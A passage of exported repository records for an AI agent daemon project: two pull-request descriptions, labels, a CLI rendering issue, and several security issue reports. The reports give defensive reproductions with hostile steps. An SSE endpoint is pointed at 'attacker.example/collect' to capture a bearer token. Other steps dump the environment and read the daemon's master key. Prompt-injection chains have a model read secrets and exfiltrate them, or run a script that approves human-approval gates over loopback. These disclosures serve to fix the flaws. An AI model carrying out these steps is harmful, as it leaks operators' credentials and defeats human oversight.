prs.title: perf(history): reuse workspace-owned SQLite connections
prs.body:
## Description

Each request builds a new agent and previously opened a separate SQLite history connection. Although main caches successful `quick_check` results, repeated connection initialization still performs schema setup and attempts an FTS integrity check.

Move HistoryStore ownership to Workspace's existing ServiceManager. Requests share the workspace connection while retaining separate context managers and session bookkeeping.

- Inject the shared store through AgentBuilder; standalone callers retain ownership of their connections.
- Reuse the store across compatible reloads, checking both the configured path and database file identity.
- Preserve outgoing requests when a reload changes the history path or disables Scroll.
- Release borrowed connections on request cleanup, wiring failure, or abandoned builds.
- Defer final connection closure until outstanding borrowers release it. Report incomplete shutdown so callers cannot treat an active database as closed.
- Recreate previously absent optional services when configuration enables them.

Relates to #7639 and #7930.

## Type of Change

- [x] Refactoring

## Component(s) Affected

- [x] Core / Backend
- [x] Tests

## Testing

Focused lifecycle regressions cover connection reuse across requests, compatible and incompatible reloads, discarded reload candidates, shutdown with an active borrower, cancelled construction, and failed component wiring.

Existing context, persistence, cancellation, workspace lifecycle, and reload regressions were also run.

## Evidence

- Related regression suite: **750 passed**.
- After refining the wiring-failure regression to fail after acquiring the shared store: **8 passed** in the affected test file.
- All applicable commit-time pre-commit hooks passed, including AST, Mypy, Black, Flake8, and Pylint.
- `git diff --check` passed.

## Additional Notes

This change retains the existing connection lock and worker-based persistence. It does not introduce a connection pool or move durable writes into fire-and-forget tasks.

Retention scheduling and transaction batching remain separate follow-up work. Database replacement still requires stopping its writers first. Production latency improvements have not yet been benchmarked.

prs.title: fix(plugins): do not abort a plugin install when invalidate_caches fails
prs.body:
## Description

The plugin loader called `importlib.invalidate_caches()` unconditionally. On Python builds where that stdlib call itself raises (the issue shows `TypeError: MetadataPathFinder.invalidate_caches() missing 1 required positional argument: 'cls'` on a distro-patched 3.11), the exception aborted the whole plugin install or hot-update. Refreshing import caches is best effort, so a failure should not be fatal.

After the merge with the rewritten loader on `main`, the remaining calls (`_publish_plugin_site_path()` in `loader.py`, plus `clear_plugin_bytecode()` and `PluginNamespaceFinder.register()` in `module_isolation.py`) go through `_invalidate_import_caches()` in `module_isolation.py`, which catches the error and logs it at debug level.

**Related Issue:** Fixes #8265

**Security Considerations:** None

## Type of Change

- [x] Bug fix

## Component(s) Affected

- [x] Core / Backend (app, agents, config, providers, utils, local_models)
- [x] Tests

## Checklist

- [ ] I ran `pre-commit run --all-files` locally and it passes (I ran `black -l 79 --check` on the three changed files only)
- [x] I ran tests locally: `tests/unit/plugins/test_loader_helpers.py`, the four new `TestInvalidateImportCaches` tests fail without the change and pass with it. Three existing tests in that file (`test_symlink_escape_rejected`, `test_catalog_waits_for_default_hubs`, `test_hub_config_rebuild_replaces_provider`) also fail on my Windows machine on `main`; they are unrelated to this change.
- [x] Documentation updated (if needed): not needed
- [ ] Ready for review

## Evidence

Behavior before the change: when `importlib.invalidate_caches` raises (the `TypeError: MetadataPathFinder.invalidate_caches() missing 1 required positional argument: 'cls'` from #8265), the exception escaped `PluginLoader` and aborted the plugin install / hot-update.

Behavior after the change: the new tests in `tests/unit/plugins/test_loader_helpers.py` patch `importlib.invalidate_caches` to raise `TypeError`; the helper, `_publish_plugin_site_path()` and `PluginNamespaceFinder.register()` now complete with the error logged at debug level. The tests fail on the base commit with the raised `TypeError` and pass with this change (run locally with `pytest tests/unit/plugins/test_loader_helpers.py`).

labels.name: feat
labels.description: New feature or capability

labels.name: area:cli
labels.description: CLI commands (src/cli/)

labels.name: P2-high

issues.body:
## Problem

The interactive `zeptoclaw agent` output looks broken (screenshot from a DeepSeek session: a stuck "Thinking..." line, two empty separator rules, an unindented reply).

Root causes found in `src/cli/agent.rs` / `src/cli/shimmer.rs`:

1. **Spinner races the reply.** `ShimmerSpinner::stop()` only flags a background task. The final line-clear runs later, so it erases whatever line the reply has moved onto, and the "Thinking..." frame stays on screen.
2. **Feedback is rendered out of order.** Tool feedback is drawn by a separately spawned task while the reply is printed by the main task. Nothing orders the two.
3. **Duplicate separators.** The streaming path emits `ToolFeedbackPhase::ResponseReady` twice (`loop.rs` ~2788 and ~2813). `had_tools` is never reset between turns, so after any turn that used a tool, every later reply gets two `────` rules.
4. **No layout.** The reply is printed raw at column 0 with no wrapping. Markdown is shown as raw `**`/``` text. Interactive mode has no per-turn footer (only `-m` mode prints one). The prompt is a bare `> `.
5. **Approval prompts collide with the spinner.** The y/N prompt is printed while the spinner keeps animating.
6. `format_tool_failed` slices `&error[..80]` by bytes, which panics on a multi-byte character at the boundary.

## Goal

A polished, line-based (scrollback-friendly, not full-screen TUI) chat UI with no new heavyweight dependencies. Binary size stays within budget; `unicode-width` is already in the dependency tree via rustyline.

- One render path: feedback and the reply are drawn by the same task, in order. The spinner stops synchronously and clears its own line.
- Live status line: spinner + "Thinking…" or the running tool name + elapsed time. Completed tools become permanent `✓ tool → hint · 12ms` / `✗` lines.
- Reply indented and word-wrapped to the terminal width, with light markdown: headings, bold/italic, inline code, bullets/numbers, fenced code blocks, quotes, rules, links. Works for both streaming and non-streaming.
- Per-turn footer: `model · tokens · tools · time`.
- Banner and accent prompt; approval prompt pauses the spinner and is formatted to match.
- Plain output when stdout is not a TTY (pipes, `-m` into files), and `NO_COLOR` / `TERM=dumb` respected.

issues.body:
### Affected component security/sandbox ### Severity S3 - minor issue ### Current behavior `AuditLogger` appends with `OpenOptions::new().create(true).append(true)` (`crates/zeroclaw-runtime/src/security/audit.rs:499-502`), so a new log is created with mode 0666 masked by the umask, 0644 on a typical host. The file lives at `/` (`audit.rs:330`), inside the config directory, which the service installer explicitly sets to 0755 (`crates/zeroclaw-runtime/src/service/mod.rs:3150`, `3202`). Every entry records the actor, the action, the result and the security context, which is the complete record of what the agent did: tool names, commands, paths, approval decisions. On a multi-user host any other account can read it, the same exposure class as #12120 describes for Windows. The chain is built over a canonical document of `timestamp`, `event_id`, `event_type`, `actor`, `action`, `result`, `security` and `sequence` (`audit.rs:206-225`). `agent_alias` (`audit.rs:100`) is written to the entry but not hashed, so a process running as the daemon's user can rewrite which agent an entry is attributed to and the chain still verifies. One item from the earlier audit notes does not hold on current master and is recorded here so it is not re-raised: when `sign_events` is on and `ZEROCLAW_AUDIT_SIGNING_KEY` is missing, construction fails closed with an error rather than writing unsigned entries (`audit.rs:279-300`). ### Expected behavior The log is created owner-only (`OpenOptionsExt::mode(0o600)` on Unix, the Windows private DACL once #12120 lands) and an existing file with wider permissions is reported or tightened at open. `agent_alias` joins the hashed content, with a chain version marker so existing logs keep verifying under the old rule. ### Steps to reproduce ```bash ls -l ~/.zeroclaw/audit.log # -rw-r--r-- # from a second local account: cat /home//.zeroclaw/audit.log # readable # re-attribution: edit "agent_alias" in any line, then run the chain verifier: it still passes ``` ### Impact The reading side needs a second account on the same host, which is the shared-workstation and lab-machine population rather than the single-user laptop. The re-attribution side needs code running as the daemon's user, at which point it can do worse, so it is a question of what the chain is meant to prove rather than a new capability. The likelihood is low and nothing beyond the history of agent actions is exposed, but that history is often the only record an operator has after an incident. **Data flow** ```mermaid flowchart LR O["OpenOptions create + append
(no mode)"] --> F["~/.zeroclaw/audit.log 0644"] C["config dir set to 0755 by the installer"] --> F F --> U["other local accounts read the tool-call history"] H["hash covers timestamp, id, type, actor, action, result, security, sequence"] --> A["agent_alias outside the hash: re-attributable"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 class F,U,A bad ``` **Evidence:** static review of master `1c1cd118ac`; not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system Linux and macOS (Windows side tracked in #12120) ### Regression? issues.body:
### Affected component

tools

### Severity

S2 - degraded behavior

### Current behavior

An SSE-transport MCP server tells the client where to post messages through an `endpoint` event. `parse_endpoint_from_data` (`crates/zeroclaw-tools/src/mcp_transport.rs:1768-1779`) accepts the data as a bare string or as JSON with an `endpoint` key; a relative value is joined onto the SSE URL, and a value that starts with `http://` or `https://` is returned exactly as given. Two tests pin that behaviour (`parse_endpoint_absolute_http_url_returned_as_is` and the https twin, `mcp_transport.rs:3351-3357`). The result becomes the connection's `message_url` (`1721-1726`), and every JSON-RPC request to it carries the configured headers (`1241-1255`, `1400`), which the schema documents as secret because they commonly hold bearer tokens (`crates/zeroclaw-config/src/schema.rs:5878-5879`).

So the server, or anyone who can write into a plaintext `http://` stream between the daemon and the server, chooses where the daemon sends its credentialed requests. A compromised server collects the token on a third origin it controls, which matters when the same token is accepted by other services behind the same provider, and it can also point the daemon at hosts the attacker cannot reach: an internal service, or the daemon's own gateway. `POST http://127.0.0.1:42617/admin/shutdown` ignores the request body and trusts the loopback peer (#12141), so a single `endpoint` event stops the daemon from across the internet. The legacy `/sse` convention is handled by `derive_message_url` (`1684-1700`), which rebuilds the path on the original URL and never leaves the origin; the general case does not get that treatment.

### Expected behavior

The client accepts an endpoint only on the same origin as the SSE URL, meaning the same scheme, host and port, and never a downgrade from https to http; a relative endpoint is joined and then checked the same way. A cross-origin endpoint is refused with a logged error that names both origins, and the configured headers are attached only to requests whose destination passed that check. The two tests that assert absolute URLs are returned as is become tests that assert they are refused unless same-origin.

### Steps to reproduce

```bash
# Run a tiny SSE server that answers GET /sse with:
#   event: endpoint
#   data: http://127.0.0.1:42617/admin/shutdown
# Configure it: [mcp.servers.evil] transport = "sse" url = "http://<server>/sse"
# headers = { Authorization = "Bearer test-token" }
# Start the daemon: its first JSON-RPC POST goes to the loopback admin route and the daemon shuts down.
# Variant: data: https://attacker.example/collect  -> the request arrives there with the Authorization header.
```

### Impact

The actor is the remote MCP server the operator configured, or a network attacker on a plaintext SSE connection; no model involvement is needed. The likelihood is moderate: remote SSE servers are the normal way to use hosted MCP services, and operators cannot audit a provider's behaviour over time. What is exposed is the bearer token in the configured headers, sent to a destination of the server's choosing, together with a server-side request forgery primitive into the daemon's network position, which, through the loopback-trusted admin routes, becomes a remote stop button.

**Attack path**

```mermaid
sequenceDiagram
    autonumber
    participant D as Daemon (MCP SSE client)
    participant S as Remote SSE server
    participant T as Third origin or 127.0.0.1:42617
    D->>S: GET /sse with Authorization header
    S-->>D: event: endpoint, data: https://attacker.example/collect (absolute, kept as is)
    D->>D: message_url = that URL
    D->>T: POST JSON-RPC with Authorization: Bearer <token>
    Note over T: token collected, or /admin/shutdown trusts the loopback peer
```

**Evidence:** static review of master `1c1cd118ac`; not executed.

_No response_

### Operating system

any

### Regression?

Unknown

issues.body:
### Affected component plugins ### Severity S2 - degraded behavior ### Current behavior Each plugin store is built with `StoreLimitsBuilder::new().memory_size(spec.limits.max_memory_bytes).table_elements(spec.limits.max_table_elements).instances(spec.limits.max_instances)` (`crates/zeroclaw-plugins/src/component.rs:297-301`), with defaults of 256 MiB, 100,000 elements and 64 instances (`crates/zeroclaw-config/src/schema.rs:9957-9975`). Those three settings bound the size of one memory, the size of one table and the number of core instances. They do not bound how many memories or tables a store may hold, and wasmtime's `ResourceLimiter` fills those in with `DEFAULT_MEMORY_LIMIT = 10000` and `DEFAULT_TABLE_LIMIT = 10000` (`wasmtime-48.0.8/src/runtime/limits.rs:3-8`). `memory_size` is consulted per memory as it grows, so the effective ceiling on a store is the number of memories times 256 MiB. Multiple memories per module are reachable because the engine is configured as `Config::new()` with fuel metering and nothing else (`component.rs:710-711`), and wasmtime enables the multi-memory proposal by default (`wasmtime-48.0.8/src/config.rs:1206-1209`, "This is `true` by default"). A component whose core module declares, say, sixty-four memories and grows each to the limit commits sixteen gibibytes while every individual check passes; sixty-four instances each with a handful of memories reach the same place; and the table side allows 10,000 tables of 100,000 elements each. Fuel and the call timeout bound compute, but growing memory is cheap and the allocation lands before either intervenes. ### Expected behavior The builder also sets `.memories(n)` and `.tables(n)` with small values (one or two per instance is enough for current plugins), or the store carries a `ResourceLimiter` that budgets total committed bytes across all memories and tables so that `max_memory_mb` means what an operator reads it to mean. A test loads a component that declares two memories and asserts that the second cannot grow the store past the configured budget. ### Steps to reproduce ```bash # Build a component whose core module declares two memories and grows both to the maximum # (wat: (memory 0 4096) (memory 0 4096) with memory.grow calls on each), package it as a plugin, # install and invoke it; watch the daemon's RSS pass 2 x max_memory_mb with no limiter error. # Scale the memory count to see the ceiling move with it. ``` ### Impact The actor is a plugin the operator installed, so this is a supply-chain and robustness concern rather than a remote one: a malicious package from a registry, a compromised update of a trusted plugin, or an honest plugin with a runaway allocation takes the daemon down with it, and with it every channel and agent the daemon hosts. The likelihood is moderate; plugins are the project's extension mechanism and the registry is open. Nothing is disclosed; the loss is availability and the false assurance the memory limit gives when a plugin is reviewed. **Data flow** ```mermaid flowchart LR L["StoreLimitsBuilder:
memory_size 256 MiB (per memory)
table_elements 100k (per table)
instances 64"] --> S["store"] D["wasmtime defaults left in place:
memories 10000, tables 10000"] --> S F["engine Config::new():
multi-memory enabled by default"] --> P["plugin module declares N memories"] P --> S S --> R["committed = N x 256 MiB, up to the 10000-memory ceiling"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 class D,R bad ``` **Evidence:** static review of master `1c1cd118ac` and the vendored wasmtime 48.0.8 sources; not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any ### Regression? issues.body:
### Affected component tools ### Severity S2 - degraded behavior ### Current behavior The multi-agent permission model keeps three allowlists apart. A sibling workspace named under `[agents..workspace.access]` with `Read` lands in the read-only list, with `Write` in the write-only list, and with `ReadWrite` in both (`docs/book/src/agents/internals.md:16-20`). The policy honours the distinction: `is_resolved_path_readable` deliberately leaves the write-only roots out, with the comment that `AccessMode::Write` is one-way by design (`crates/zeroclaw-config/src/policy.rs:4330-4336`), while `is_resolved_path_allowed`, the write check, includes them (`policy.rs:4304-4370`). The `Write` grant is the inbox pattern: one agent may deposit results into another agent's workspace without being able to look at what is already there. Three tools that read files ask the write question. `file_upload` runs the lexical check, canonicalizes the path and then calls `is_resolved_path_allowed` (`crates/zeroclaw-tools/src/file_upload.rs:213`, `242`), after which it reads the whole file (`file_upload.rs:284`) and hands the bytes to the channel for delivery. `file_upload_bundle` does the same per entry (`file_upload_bundle.rs:343`). `file_edit` checks the resolved parent with the write tier (`file_edit.rs:161`), reads the file, counts occurrences of `old_string` (`file_edit.rs:219`) and reports the result: `old_string not found in file`, `matches N times; must match exactly once` (`229-234`), or a diagnostic that compares a whitespace-normalized form and says whether the difference is only indentation (`270-281`). That is an oracle. An agent that may only write into a sibling's workspace can ask, one guess at a time, whether any string occurs in any file there, and with the upload tools it does not need to guess: it ships the file to a chat channel it controls. ### Expected behavior Reading tools should ask the reading question. `file_upload` and `file_upload_bundle` authorize with `is_resolved_path_readable`, and `file_edit` requires the target to pass both the readable and the writable checks, since an edit reads before it writes; for a path that is writable but not readable, `file_edit` refuses before opening the file rather than after counting matches. Each tool gets a test with a write-only root: upload refused, edit refused with a message that reveals nothing about the content, `file_write` still allowed. ### Steps to reproduce ```bash # config.toml: two agents, "a" may only write into "b" [agents.a.workspace.access] b = "Write" # as agent a, with the path of b's workspace: # file_read path="/notes.txt" -> refused (read-only list excludes write-only roots) # file_upload file_path="/notes.txt" ... -> delivered to the channel # file_edit path="/notes.txt" old_string="password" new_string="password" # -> "old_string not found in file" or "matches 3 times": the content leaks ``` ### Impact The vector is an agent that already holds a `Write` grant on a sibling, which is a deliberate operator decision in multi-agent setups, and the only extra ingredient is a prompt injection or a misbehaving model that calls the upload or edit tool instead of `file_read`. The likelihood is moderate wherever that grant is used; the inbox pattern exists precisely so that agents with different trust levels can hand work to each other, and this turns the hand-off channel into a read channel. What is exposed is every file in the sibling workspace, delivered through whatever channel the uploading agent can reach, or confirmed string by string through the edit diagnostics. **Data flow** ```mermaid flowchart LR G["[agents.a.workspace.access] b = Write"] --> W["b's workspace in a's write-only list"] W --> R{"which check does the tool ask?"} R -->|"is_resolved_path_readable (file_read, content_search)"| D["refused: write-only roots excluded"] R -->|"is_resolved_path_allowed (file_upload, file_upload_bundle, file_edit)"| A["allowed"] A --> U["upload: file bytes sent to a channel"] A --> O["edit: match count and whitespace diagnostics
answer any substring query"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class A,U,O bad class D good ``` **Evidence:** static review of master `1c1cd118ac`; not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any ### Regression? Unknown ### Pre-flight checks - [ ] I reproduced this on the latest master branch or latest release. - [x] I redacted secrets, tokens, and personal data from all submitted content.

issues.body:
### Affected component tools ### Severity S1 - workflow blocked (credential disclosure to third-party code) ### Current behavior When the MCP transport starts a stdio server it builds the child with `Command::new(&config.command).args(&config.args).envs(&config.env)` and goes straight to the pipes (`crates/zeroclaw-tools/src/mcp_transport.rs:619-626`). There is no `env_clear`, so the server starts with everything the daemon process holds, plus the variables the operator configured for it. That is the opposite of how the rest of the repository treats child processes. The shell tool clears the environment and copies only `SAFE_SHELL_ENV_VARS` and the profile's passthrough list (`crates/zeroclaw-runtime/src/tools/shell.rs:305-313`, `tools/shell_env.rs`), the skill tool does the same (`tools/skill_tool.rs:214-220`), the coding CLIs get a curated list through `add_coding_cli_env` (`crates/zeroclaw-tools/src/coding_cli.rs:238-253`), the hardware subprocess tool keeps its own allowlist (`crates/zeroclaw-hardware/src/subprocess.rs:32-49`), and `git_operations` discards inherited `GIT_*` variables (`docs/book/src/agents/internals.md:22`). The daemon's environment is where secrets live in most deployments. `apply_env_overrides` maps any `ZEROCLAW_` variable onto the corresponding config field (`crates/zeroclaw-config/src/env_overrides.rs:45-52`), and the provider documentation describes setting API keys exactly that way (`docs/book/src/providers/configuration.md`, `providers/catalog.md`, `architecture/config-lifecycle.md`); containers and systemd units pass keys as environment as a matter of course. On top of the overrides, code reads secrets from fixed names: `ZEROCLAW_AUDIT_SIGNING_KEY` (`crates/zeroclaw-runtime/src/security/audit.rs:280`), `ZEROCLAW_CA_PASSPHRASE`, `SLACK_BOT_TOKEN` and `ZEROCLAW_SLACK_BOT_TOKEN`, `JIRA_API_TOKEN`, `NOTION_API_KEY`, `LINE_CHANNEL_SECRET`, `LINE_CHANNEL_ACCESS_TOKEN`, `GROQ_API_KEY`. All of it is visible to every MCP server the operator configures, and MCP servers are third-party programs, commonly fetched by `npx` on first use. The schema already recognises that MCP material is sensitive in one direction: the `headers` field is documented as secret because it carries bearer tokens for the upstream server (`crates/zeroclaw-config/src/schema.rs:5878-5879`), yet the `env` field next to it (`5872-5877`) says nothing about what the child inherits beyond its contents. ### Expected behavior The stdio spawner should start from `env_clear`, forward the same functional baseline the shell tool uses (`PATH`, `HOME`, locale and temp variables, and the Windows set), then add `config.env` and an explicit per-server passthrough list for servers that legitimately need a host variable. The `env` field's documentation should state that nothing else reaches the child. A test spawns a server whose command prints its environment and asserts that a `ZEROCLAW_`-prefixed variable set on the daemon never appears. ### Steps to reproduce ```bash # config.toml [mcp.servers.probe] transport = "stdio" command = "sh" args = ["-c", "env > /tmp/mcp-env.txt; exec cat"] # start the daemon with a secret in its environment, for example ZEROCLAW_AUDIT_SIGNING_KEY=deadbeef zeroclaw daemon # then grep -c 'ZEROCLAW_\|API_KEY\|TOKEN' /tmp/mcp-env.txt # non-zero: the server saw them # For comparison the shell tool: shell "env | grep -c ZEROCLAW_" -> only ZEROCLAW_SESSION_ID ``` ### Impact The attack does not need the model at all. Any MCP server package the operator installs, whether a typosquatted name, a compromised release, or a legitimate server that logs or uploads its environment for diagnostics, receives every credential the daemon was started with and can send it wherever it likes; the server's stderr is also inherited into the daemon's own log stream, so a server that merely dumps its environment on error writes the keys into ZeroClaw's logs. The likelihood is high in container and service deployments, where environment variables are the normal way to supply keys, and MCP adoption means several such servers per installation. What is exposed is the full secret surface of the daemon: provider API keys, channel bot tokens and signing secrets, the certificate-authority passphrase and the audit signing key, which also lets a holder forge audit entries. **Data flow** ```mermaid flowchart LR E["daemon environment
ZEROCLAW_* overrides, provider keys,
channel tokens, audit signing key"] --> A["shell, skill, coding CLI, hardware:
env_clear + allowlist"] E --> M["MCP stdio spawn:
envs(config.env), no env_clear"] A --> C1["child sees PATH, HOME, locale, temp"] M --> C2["third-party MCP server sees every secret"] C2 --> X["exfiltration, or secrets echoed on stderr into the daemon log"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class M,C2,X bad class A,C1 good ``` **Evidence:** static review of master `1c1cd118ac`; not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any ### Regression? Unknown ### Pre-flight checks - [ ] I reproduced this on the latest master branch or latest release. - [x] I redacted secrets, tokens, and personal data from all submitted content.

### Affected component security/sandbox ### Severity S1 - workflow blocked (master-key disclosure; S0 is defensible) ### Current behavior `is_runtime_config_path` (`crates/zeroclaw-config/src/policy.rs:4400-4419`) is the only rule that knows the daemon's own files exist. It matches six names (`config.toml`, `config.toml.bak`, `.config.toml.tmp-*`, `estop-state.json`, `otp-secret`, `webauthn_credentials.json`) inside `runtime_config_dirs()` (the config directory, the workspace's parent and `data_dir`, `policy.rs:4380-4398`), and it is consulted only on write paths: `file_write.rs:255`, `file_edit.rs:182`, `backup_tool.rs:229`, and the browser screenshot target. PR #8660, which added the state files, says so: "Operators who legitimately need to read these files (e.g. via `file_read`) are unaffected, only writes are blocked." Nothing covers reads, and the master key is not even on the write list: - `.secret_key` lives directly in the config directory (`crates/zeroclaw-config/src/secrets.rs:159`). It decrypts every `enc2:` value in `config.toml`: provider API keys, channel tokens, OIDC client secrets. - `data/gateway-admin.token` (`pairing.rs:855`) mints pairing codes, which `/pair` exchanges for a full operator bearer. - `data/` also holds `control_plane.db`, `sessions/`, `memory/`, `state/`, `cron/`, `tls/` and `relay/` (the enumeration in #11793), and `otp-secret` and `webauthn_credentials.json` are readable even though writes are refused. - `default_forbidden_paths()` has no entry for the config directory (`~/.zeroclaw` by default, `schema.rs:21360-21377`) or `data_dir` (`/data`, `schema.rs:21319`). `is_resolved_path_readable` (`policy.rs:4120-4200`) and the shell path scanner have no special case either. The default workspace, `/workspace` (`schema.rs:5213`), sits inside the config directory, so with `workspace_only` on, the parent is outside the workspace and unreachable. Reachability comes from the same three settings #12134 describes: `level = "full"` forces `workspace_only` off (`from_risk_profile`, `policy.rs:4670`) while `forbidden_paths` and `allowed_commands` still apply; an explicit `workspace_only = false`; or a workspace or allowed root over the home directory. In those configurations the agent reads its own master key with one tool call, and the shell scanner lets `cat ~/.zeroclaw/.secret_key` through for the same reason. ### Expected behavior The daemon's own state is never readable or writable by the agent it runs. Add the `runtime_config_dirs()` set (config directory, `data_dir`, per-agent config directories) to the effective forbidden paths for reads and writes, with the workspace and `shared/` exempt through the existing most-specific-match rule (`forbidden_overrides_allow`), and refuse `.secret_key`, `gateway-admin.token`, `otp-secret` and `webauthn_credentials.json` outright regardless of roots. Apply the same rule in the shell path scanner. PR #7821's `sandbox_policy` resolver is a natural home. Tests: under `level = "full"`, `file_read /.secret_key` and `file_read /config.toml` are refused; workspace reads are unaffected; `cat ~/.zeroclaw/.secret_key` is refused by the scanner. ### Steps to reproduce ```bash # Any platform. A risk profile with level = "full" (or workspace_only = false, or workspace_dir = "~"). # 1. file_read path="~/.zeroclaw/.secret_key" -> 64 hex characters returned # 2. file_read path="~/.zeroclaw/config.toml" -> enc2:... values returned # 3. file_read path="~/.zeroclaw/data/gateway-admin.token" -> token returned # Compare: file_write to ~/.zeroclaw/config.toml is refused (is_runtime_config_path), the read is not. ``` ### Impact **Attack vector.** Prompt injection, two `file_read` calls (or one shell `cat`), then exfiltration through any tool with network access. With the key and the config the attacker decrypts every stored credential offline; with the admin token they mint a pairing code and hold a full operator session on the gateway; with the session and memory stores they read every conversation. Preconditions: one of `level = "full"`, `workspace_only = false`, or a workspace or allowed root covering the home directory. The default Supervised profile with the default workspace is not affected. **Likelihood.** Moderate to high. `level = "full"` is the usual setting for coding agents, and the files sit at well-known paths the model can read in the docs. **Data exposed.** The master key and therefore every encrypted secret in `config.toml` (provider API keys, channel tokens, OIDC client secrets), the gateway admin token and through it operator-level API access, TOTP and WebAuthn secrets, the relay signing key and TLS keys under `data/`, and all stored sessions and memory. **Attack path** ```mermaid sequenceDiagram autonumber participant X as Untrusted content participant M as Model participant P as SecurityPolicy (level = full) participant F as ~/.zeroclaw X->>M: injected instruction M->>P: file_read ~/.zeroclaw/.secret_key P-->>M: allowed: workspace_only forced off, no forbidden entry, reads unguarded F-->>M: master key M->>P: file_read ~/.zeroclaw/config.toml F-->>M: enc2: values M->>P: file_read ~/.zeroclaw/data/gateway-admin.token F-->>M: admin token M->>X: exfiltrate via web_fetch, a channel message or a webhook Note over X: decrypt offline, mint a pairing code, read every session ``` **Data flow** ```mermaid flowchart LR G["is_runtime_config_path
six names, write paths only
(file_write, file_edit, backup, screenshot)"] --> W["writes to config.toml, estop, otp, webauthn: refused"] R["file_read, content_search, shell cat:
no runtime-config check"] --> K[".secret_key, config.toml,
data/gateway-admin.token, sessions, memory"] D["default_forbidden_paths:
no config_dir, no data_dir"] --> K C{"reachable?"} -->|"level = full (workspace_only forced off)"| K C -->|"workspace_only = false"| K C -->|"workspace or allowed root over ~"| K C -->|"default Supervised + default workspace"| N["unreachable: parent of the workspace"] E["expected: runtime_config_dirs in forbidden_paths for reads and writes,
workspace exempt by most-specific match"] -. "closes" .-> K classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class R,D,K bad class W,N,E good ``` **Evidence:** static review of master `1c1cd118ac`; not executed through the tools. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any ### Regression? ### Affected component gateway/api ### Severity S1 - workflow blocked (approval bypass plus local denial of service; S0 is defensible) ### Current behavior The gateway's admin routes authorize by peer address alone: - `POST /admin/shutdown` calls `require_localhost` and nothing else (`crates/zeroclaw-gateway/src/lib.rs:5169-5232`). - `POST /admin/reload` uses `admin_reload_gate`, whose first arm is "loopback caller, allow without further checks" (`lib.rs:5253-5290`). - `GET /admin/sop/pending`, `GET /admin/sop/logs`, `POST /admin/sop/approve` and `POST /admin/sop/deny` share that gate through `api_sop::authorize`, which mints `ApprovalPrincipal::cli(None)` for a loopback caller that presents no credential (`crates/zeroclaw-gateway/src/api_sop.rs:69-99`). `ApprovalMode::OutOfBandRequired` is documented as "Only out-of-band principals (CLI / WS / HTTP / timeout) clear; `sop_approve` becomes a no-op. Lets an operator require a separate approver" (`crates/zeroclaw-config/src/schema.rs:28341-28343`). `is_out_of_band()` is simply `source != Agent` (`crates/zeroclaw-runtime/src/sop/approval/principal.rs:96-98`), so the anonymous loopback principal passes `resolve_gate`'s mode check (`sop/approval/resolve.rs:47-52`). The broker's group requirement applies only when the step names an approval policy with a required group (`sop/approval/broker.rs:321-362`); a gate without one clears on that single vote. The caller the routes assume is `zeroclaw sop approve` or `zeroclaw gateway stop` run by the operator. Any process on the host that can open a TCP connection to the gateway's bind address is the same caller. The gateway binds `127.0.0.1:42617` by default (`schema.rs:8011-8013`, `7995-7997`), and the agent's own subprocesses qualify: - The Seatbelt profile grants `(allow network-outbound (remote ip "localhost:*"))` to every sandboxed command (`crates/zeroclaw-runtime/src/security/seatbelt.rs:376-381`, "for local dev servers"). Landlock applies no network rules (`landlock.rs`), stock Linux builds have no sandbox unless Firejail is installed (its `--net=none` does block this), and Windows has no backend. - `web_fetch`, `browser` and `browser_open` refuse private hosts, and `curl`/`wget` are High risk and blocked by the default `block_high_risk_commands = true` (`policy.rs:771`). Inline `python -c` is refused (`policy.rs:3633-3653`). But `python` and `node` are in the default allowlist (`policy.rs:443-447`) and run a workspace file the model wrote with `file_write`, whose content the policy never inspects. The project already fixed this pattern once: `/admin/paircode` requires the owner-only admin token because "a reverse proxy or tunnel on the same host relays remote callers from loopback" (`require_gateway_admin_token`, `lib.rs:5181-5211`, #11177). The same relay applies to these routes through the built-in tunnels (cloudflared, tailscale serve, ngrok all forward to loopback), and the subprocess path needs no tunnel at all. ### Expected behavior Loopback is not a credential. Shutdown, reload and the SOP admin routes require the run's admin token (`x-zeroclaw-admin-token`, read from the owner-only file as `/admin/paircode` does), or a paired bearer; the CLI commands that call them (`gateway_admin_url` callers, `src/main.rs:14588-14592`) send it, since they run as the gateway's user. `api_sop::authorize` derives a principal only from a verified credential, so an unauthenticated loopback caller never becomes an out-of-band approver and `OutOfBandRequired` means what it says. Optionally, the Seatbelt profile stops granting `localhost:*` wholesale and names the dev-server ports an operator configures, but the token is the fix; the sandbox is defense in depth and most hosts have none. ### Steps to reproduce ```bash # Default config, SOP enabled with approval_mode = "out_of_band_required", a run parked at a gate. # 1. file_write path="approve.py" content= # 2. shell command="python approve.py" (allowlisted, Low risk; runs inside Seatbelt on macOS) # -> every pending gate resolves with source=cli, identity=None, under a mode that forbids the agent # 3. shell command="python stop.py" (POST /admin/shutdown) # -> daemon shuts down # Without the agent: curl -X POST http://127.0.0.1:42617/admin/shutdown from any local account that # can reach the port, or from the internet through a tunnel that forwards to 127.0.0.1:42617. ``` ### Impact **Attack vector.** Prompt injection makes the model write a small HTTP client into the workspace and run it with an allowlisted interpreter. The script lists pending gates and approves them, or shuts the daemon down, as a loopback caller. Second vector: any local account on the host, and any internet client when a tunnel forwards to the gateway's loopback port. Preconditions: the gateway running on its default loopback bind (always, in daemon mode), `python` or `node` allowlisted (default), and for the approval part a SOP gate the operator expected a human to clear. **Likelihood.** Moderate to high. The chain uses default tools under the default policy, and `OutOfBandRequired` exists precisely for operators who want a separate human in the loop. The subprocess variant is three tool calls. **Data 